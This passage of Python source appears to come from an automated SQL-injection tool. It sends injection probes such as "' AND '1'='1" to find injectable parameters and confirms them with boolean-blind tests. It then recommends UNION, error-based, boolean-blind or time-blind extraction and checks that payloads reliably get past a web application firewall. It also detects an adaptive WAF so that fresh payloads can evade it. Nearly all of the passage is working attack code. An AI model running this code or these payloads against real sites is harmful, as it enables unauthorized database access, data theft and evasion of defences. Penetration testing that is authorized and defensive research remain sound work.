            ("')", "single_paren", r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
            ("\")", "double_paren", r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
            ("",   "numeric",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
            # Forced syntax error probes — more likely to trigger SQL errors on injectable params
            ("'-- -", "single",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
            ("' AND '1'='1", "single",  r"syntax error|mysql|unclosed|unterminated|pg_|ora-|sqlite"),
        ]

        for suffix, quote_type, error_pattern in forced_probes:
            try:
                result = self.inject(path, f"1{suffix}", param, method, data)
                text_lower = result.response_text.lower()

                # Check for SQL error indicators (KB + regex)
                has_error = bool(re.search(error_pattern, text_lower))
                # Also check via Knowledge Base for broader coverage
                if not has_error:
                    kb = get_kb()
                    kb_matches = kb.match(result.response_text)
                    if kb_matches:
                        has_error = True
                is_500 = result.status_code == 500

                test_entry = {
                    "probe": f"1{suffix}",
                    "quote_type": quote_type,
                    "status": result.status_code,
                    "has_sql_error": has_error,
                    "is_500": is_500,
                    "snippet": result.response_snippet[:100] if hasattr(result, 'response_snippet') else result.response_text[:100],
                }
                results.append(test_entry)

                if has_error or is_500:
                    detected_quote = quote_type
                    is_injectable = True
                    best_confidence = max(best_confidence, 0.7)
                    # Try to detect DBMS from error
                    for dbms, patterns in SQL_ERROR_PATTERNS.items():
                        for pat in patterns:
                            if re.search(pat, text_lower):
                                dbms_hint = dbms
                                break
                    break  # Found the closure type

            except Exception as e:
                results.append({"probe": f"1{suffix}", "error": str(e)})

        # Step 3: If error-based detection worked, confirm with boolean test
        if is_injectable and detected_quote != "unknown":
            for suffix_true, suffix_false, qt, comment in self.BOOLEAN_PROBES:
                if qt != detected_quote:
                    continue
                try:
                    res_true = self.inject(path, f"1{suffix_true}", param, method, data)
                    res_false = self.inject(path, f"1{suffix_false}", param, method, data)

                    len_true = len(res_true.response_text)
                    len_false = len(res_false.response_text)
                    len_diff = abs(len_true - len_false)

                    # Boolean confirmation: true/false responses should differ
                    # Threshold 15 for sensitive detection on classic ?id= params
                    if len_diff > 15 or res_true.status_code != res_false.status_code:
                        is_injectable = True
                        detected_comment = comment
                        best_confidence = min(best_confidence + 0.2, 1.0)
                        results.append({
                            "probe": f"boolean({qt})",
                            "true_len": len_true,
                            "false_len": len_false,
                            "diff": len_diff,
                            "confirmed": True,
                        })
                        break
                    else:
                        results.append({
                            "probe": f"boolean({qt})",
                            "true_len": len_true,
                            "false_len": len_false,
                            "diff": len_diff,
                            "confirmed": False,
                        })
                except Exception:
                    pass

        # Step 4: If no error-based, try boolean-only detection (numeric context)
        # Threshold 15 for sensitive detection
        if not is_injectable:
            for suffix_true, suffix_false, qt, comment in self.BOOLEAN_PROBES:
                try:
                    res_true = self.inject(path, f"1{suffix_true}", param, method, data)
                    res_false = self.inject(path, f"1{suffix_false}", param, method, data)

                    len_true = len(res_true.response_text)
                    len_false = len(res_false.response_text)
                    len_diff = abs(len_true - len_false)

                    if len_diff > 15:
                        is_injectable = True
                        detected_quote = qt
                        detected_comment = comment
                        best_confidence = 0.6
                        results.append({
                            "probe": f"boolean-only({qt})",
                            "true_len": len_true,
                            "false_len": len_false,
                            "diff": len_diff,
                            "confirmed": True,
                        })
                        break
                except Exception:
                    pass

        return {
            "is_injectable": is_injectable,
            "quote_type": detected_quote,
            "comment_style": detected_comment,
            "closure_char": {"single": "'", "double": "\"", "numeric": "",
                             "single_paren": "')", "double_paren": "\")"}.get(detected_quote, ""),
            "confidence": best_confidence,
            "test_results": results,
            "dbms_hint": dbms_hint,
        }

    # ── Deep Response Analysis ──────────────────────────────────────────

    # Extended SQL error patterns (beyond SQL_ERROR_PATTERNS)
    SQL_ERROR_KEYWORDS = [
        "sql syntax", "you have an error", "mysql_fetch", "mysql_num_rows",
        "mariadb", "microsoft ole db", "unclosed quotation mark",
        "unterminated quoted string", "pg_query", "pg_exec",
        "ora-", "sqlite3.operationalerror", "unrecognized token",
        "syntax error", "quoted string not properly terminated",
        "microsoft sql native client", "xpathsyntax", "xpath",
        "supplied argument is not a valid", "division by zero",
        "convert(", "cast(", "invalid column name",
    ]

    # Data leak signals — content that suggests UNION/error-based extraction worked
    DATA_LEAK_PATTERNS = [
        (r"first\s*name\s*:", 0.85, "First name field (UNION data)"),
        (r"surname\s*:", 0.85, "Surname field (UNION data)"),
        (r"password\s*:", 0.80, "Password field (UNION data)"),
        (r"user(name)?\s*:", 0.75, "Username field (UNION data)"),
        (r"email\s*:", 0.70, "Email field (UNION data)"),
        (r"admin", 0.50, "Admin keyword in response"),
        (r"root@", 0.85, "Root email/credential"),
        (r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", 0.60, "IP address in response"),
    ]

    def analyze_response_content(self, response_text: str, baseline_text: str = "") -> dict:
        """Deep analysis of response content for injection signals.

        Returns a structured analysis dict with:
        - sql_errors: list of detected SQL error indicators
        - data_leaks: list of data extraction signals
        - content_shift: bool (response differs significantly from baseline)
        - recommended_strategy: str (error/union/blind/time)
        - dbms_guess: str
        - reasoning: str (human-readable analysis)
        - response_preview: str (first 800 chars)
        - key_indicators: list of specific matched strings
        """
        text_lower = response_text.lower()
        analysis = {
            "sql_errors": [],
            "data_leaks": [],
            "content_shift": False,
            "has_union_data": False,
            "time_anomaly": False,
            "recommended_strategy": "unknown",
            "dbms_guess": "unknown",
            "confidence": 0.0,
            "reasoning": "",
            "response_preview": response_text[:1800],
            "key_indicators": [],
        }

        # 1. SQL error detection via Knowledge Base (primary)
        kb = get_kb()
        kb_matches = kb.match(response_text)
        if kb_matches:
            for desc, conf, dbms in kb_matches:
                analysis["sql_errors"].append(desc)
                analysis["key_indicators"].append(desc)
            analysis["dbms_guess"] = kb.get_dbms_hint(response_text)
            # Use highlighted preview when KB matches found
            highlighted, matched_kws = kb.highlight_matches(response_text, max_preview=1800)
            if matched_kws:
                analysis["response_preview"] = highlighted
                analysis["highlighted_keywords"] = matched_kws

        # Fallback: keyword-based detection
        for keyword in self.SQL_ERROR_KEYWORDS:
            if keyword in text_lower and keyword not in [m[0].lower() for m in kb_matches]:
                analysis["sql_errors"].append(keyword)
                analysis["key_indicators"].append(keyword)

        # Map to DBMS (fallback if KB didn't detect)
        if analysis["dbms_guess"] == "unknown":
            for dbms, patterns in SQL_ERROR_PATTERNS.items():
                for pat in patterns:
                    if re.search(pat, text_lower):
                        analysis["dbms_guess"] = dbms
                        break

        # 2. Data leak detection
        for pattern, conf, desc in self.DATA_LEAK_PATTERNS:
            if re.search(pattern, text_lower):
                analysis["data_leaks"].append({"pattern": desc, "confidence": conf})

        # 3. UNION data detection (from existing patterns)
        for pattern, conf, desc in UNION_DATA_PATTERNS:
            if re.search(pattern, text_lower):
                analysis["has_union_data"] = True
                analysis["data_leaks"].append({"pattern": desc, "confidence": conf})

        # 4. DB metadata detection
        for pattern, conf, desc in DB_METADATA_PATTERNS:
            if re.search(pattern, text_lower):
                analysis["data_leaks"].append({"pattern": desc, "confidence": conf})

        # 5. Content shift (vs baseline)
        if baseline_text:
            from difflib import SequenceMatcher
            sim = SequenceMatcher(None, baseline_text[:1000], response_text[:1000]).ratio()
            analysis["content_shift"] = sim < 0.7
            analysis["baseline_similarity"] = round(sim, 3)

        # 6. Determine recommended strategy
        if analysis["sql_errors"]:
            analysis["recommended_strategy"] = "error"
            analysis["confidence"] = 0.85
            analysis["reasoning"] = (
                f"SQL error detected ({', '.join(analysis['sql_errors'][:3])}). "
                f"DBMS likely: {analysis['dbms_guess']}. "
                f"Recommended: ERROR-BASED exploitation (UPDATEXML/EXTRACTVALUE)."
            )
        elif analysis["has_union_data"] or analysis["data_leaks"]:
            analysis["recommended_strategy"] = "union"
            analysis["confidence"] = 0.80
            leak_descs = [d["pattern"] for d in analysis["data_leaks"][:3]]
            analysis["reasoning"] = (
                f"Data extraction signals found: {', '.join(leak_descs)}. "
                f"Recommended: UNION-based extraction with column count probing."
            )
        elif analysis["content_shift"]:
            analysis["recommended_strategy"] = "boolean"
            analysis["confidence"] = 0.60
            analysis["reasoning"] = (
                f"Content shift detected (baseline similarity: {analysis.get('baseline_similarity', '?')}). "
                f"Response differs from baseline — possible boolean-blind injection. "
                f"Recommended: BOOLEAN-BLIND with SUBSTRING+ASCII."
            )
        else:
            analysis["recommended_strategy"] = "time"
            analysis["confidence"] = 0.30
            analysis["reasoning"] = (
                "No clear injection signal in response content. "
                "Recommended: Try TIME-BLIND (SLEEP/BENCHMARK) as last resort, "
                "or re-probe with different closure characters."
            )

        return analysis

    def deep_recon(self, path: str, param: str = "id", method: str = "GET", data: dict = None) -> dict:
        """Comprehensive recon that combines closure probing with deep response analysis.

        Returns a ReconReport with:
        - is_injectable, quote_type, closure_char, comment_style, dbms_hint, confidence
        - recon_report: structured analysis summary
        - recommended_strategy: error/union/blind/time
        - sql_error_evidence: list of SQL errors found in responses
        - data_leak_evidence: list of data extraction signals
        """
        # Step 1: Get baseline
        if not self._baseline:
            self.capture_baseline(path)
        baseline_text = self._baseline.body if self._baseline else ""
        baseline_len = self._baseline.body_length if self._baseline else 0
        baseline_time = self._baseline.response_time if self._baseline else 0.1

        # Step 2: Run standard probe
        probe_result = self.probe_injection_point(path, param, method, data)

        # Step 3: Deep analysis of all probe responses
        all_analyses = []
        sql_error_evidence = []
        data_leak_evidence = []

        for test in probe_result.get("test_results", []):
            snippet = test.get("snippet", "")
            if snippet:
                analysis = self.analyze_response_content(snippet, baseline_text)
                all_analyses.append(analysis)
                sql_error_evidence.extend(analysis["sql_errors"])
                data_leak_evidence.extend(analysis["data_leaks"])

        # Step 4: Determine overall recommended strategy
        # Priority: error > union > boolean > time
        strategies_found = [a["recommended_strategy"] for a in all_analyses if a["recommended_strategy"] != "unknown"]

        if "error" in strategies_found:
            recommended = "error"
        elif "union" in strategies_found:
            recommended = "union"
        elif "boolean" in strategies_found:
            recommended = "boolean"
        elif probe_result["is_injectable"]:
            recommended = "error"  # Default to error if injectable but no content signal
        else:
            recommended = "time"

        # Step 5: Build recon report
        report_lines = []
        if probe_result["is_injectable"]:
            report_lines.append(f"INJECTABLE — quote_type={probe_result['quote_type']}, "
                               f"closure='{probe_result['closure_char']}', "
                               f"dbms={probe_result['dbms_hint']}, "
                               f"confidence={probe_result['confidence']:.2f}")
        else:
            report_lines.append("Standard probes did not confirm injection point.")

        if sql_error_evidence:
            unique_errors = list(set(sql_error_evidence))[:5]
            report_lines.append(f"SQL errors found: {', '.join(unique_errors)}")

        if data_leak_evidence:
            unique_leaks = list(set(d['pattern'] for d in data_leak_evidence))[:5]
            report_lines.append(f"Data leak signals: {', '.join(unique_leaks)}")

        report_lines.append(f"Recommended strategy: {recommended.upper()}")

        # Step 6: Even if probe says not injectable, check if we saw SQL errors
        # (the probe might miss it if error appears but doesn't match its narrow pattern)
        has_any_sql_error = len(sql_error_evidence) > 0
        likely_injectable = probe_result["is_injectable"] or has_any_sql_error

        if not probe_result["is_injectable"] and has_any_sql_error:
            report_lines.append("NOTE: SQL errors detected despite standard probe failure — likely injectable.")
            probe_result["is_injectable"] = True
            probe_result["confidence"] = max(probe_result["confidence"], 0.65)

        probe_result["recon_report"] = " | ".join(report_lines)
        probe_result["recommended_strategy"] = recommended
        probe_result["sql_error_evidence"] = list(set(sql_error_evidence))[:10]
        probe_result["data_leak_evidence"] = [
            {"pattern": d["pattern"], "confidence": d["confidence"]}
            for d in data_leak_evidence
        ][:10]
        probe_result["response_analyses"] = all_analyses

        return probe_result

    def verify_bypass_for_exploit(
        self,
        path: str,
        payload: str,
        param: str = "id",
        method: str = "GET",
        data: dict = None,
        attempts: int = 3,
    ) -> dict:
        """Strict bypass verification for exploit-stage readiness.

        Requires ALL attempts to pass WAF (not blocked, not false positive).
        Returns {"verified": bool, "passed": int, "total": int, "details": [...]}
        """
        passed = 0
        details = []
        for i in range(attempts):
            result = self.inject(path, payload, param, method, data)
            scan = ScanResult(
                url="", method="GET", status_code=result.status_code,
                response_text=result.response_text,
                response_time=result.response_time,
                headers={}, payload=payload,
            )
            blocked = self.is_blocked(scan)
            fp = self.is_likely_false_positive(scan)
            ok = not blocked and not fp
            if ok:
                passed += 1
            details.append({
                "attempt": i + 1,
                "status": result.status_code,
                "blocked": blocked,
                "false_positive": fp,
                "passed": ok,
            })
        return {
            "verified": passed == attempts,
            "passed": passed,
            "total": attempts,
            "details": details,
        }

    def check_connection(self, path: str = "/") -> dict:
        """Quick connection check. Returns success/error info."""
        url = self._build_url(path)
        try:
            resp = self.session.get(url, timeout=5)
            return {"ok": True, "status": resp.status_code, "url": url}
        except requests.ConnectionError as e:
            return {"ok": False, "error": "ConnectionError", "detail": str(e)[:200], "url": url}
        except requests.Timeout:
            return {"ok": False, "error": "Timeout", "detail": "Connection timed out", "url": url}
        except Exception as e:
            return {"ok": False, "error": type(e).__name__, "detail": str(e)[:200], "url": url}

    def detect_adaptive_behavior(self, payload: str, path: str, param: str = "id", method: str = "GET") -> dict:
        """Detect if WAF is adapting to our attack pattern.

        Sends the same payload twice with a delay. If first passes but second blocks,
        the WAF is learning/adapting.

        Returns:
            {"is_adaptive": bool, "evidence": str, "recommendation": str}
        """
        try:
            # First attempt
            result1 = self.inject(path, payload, param, method)
            blocked1 = self.is_blocked(ScanResult(
                url="", method=method, status_code=result1.status_code,
                response_text=result1.response_text,
                response_time=result1.response_time,
                headers={}, payload=payload,
            ))

            # Wait and retry
            time.sleep(self.request_delay * 2)

            result2 = self.inject(path, payload, param, method)
            blocked2 = self.is_blocked(ScanResult(
                url="", method=method, status_code=result2.status_code,
                response_text=result2.response_text,
                response_time=result2.response_time,
                headers={}, payload=payload,
            ))

            if not blocked1 and blocked2:
                return {
                    "is_adaptive": True,
                    "evidence": "Same payload passed first time but blocked on retry — WAF is learning",
                    "recommendation": "Switch to new payload patterns immediately. Avoid repeating successful payloads.",
                }
            elif blocked1 and not blocked2:
                return {
                    "is_adaptive": False,
                    "evidence": "Inconsistent blocking — may be rate-based, not adaptive",
                    "recommendation": "Increase request delay to avoid rate-based blocking.",
                }
            else:
                return {
                    "is_adaptive": False,
                    "evidence": "Consistent behavior (both passed or both blocked)",
                    "recommendation": "WAF appears static. Continue normal operation.",
                }
        except Exception as e:
            return {"is_adaptive": False, "evidence": f"Detection failed: {e}", "recommendation": ""}

    def quick_bypass_check(
        self,
        path: str,
        payload: str,
        param: str = "id",
        method: str = "GET",
        data: dict = None,
    ) -> dict:
        """Fast single-shot bypass check (no verification loop).

        Used in Fast Test Mode to skip the 3-attempt verification loop.
        Returns {"passed": bool, "status_code": int, "blocked": bool, "false_positive": bool}
        """
        result = self.inject(path, payload, param, method, data)
        scan = ScanResult(
            url="", method="GET", status_code=result.status_code,
            response_text=result.response_text,
            response_time=result.response_time,
            headers={}, payload=payload,
        )
        blocked = self.is_blocked(scan)
        fp = self.is_likely_false_positive(scan)
        return {
            "passed": not blocked and not fp,
            "status_code": result.status_code,
            "blocked": blocked,
            "false_positive": fp,
            "response_time": result.response_time,
        }
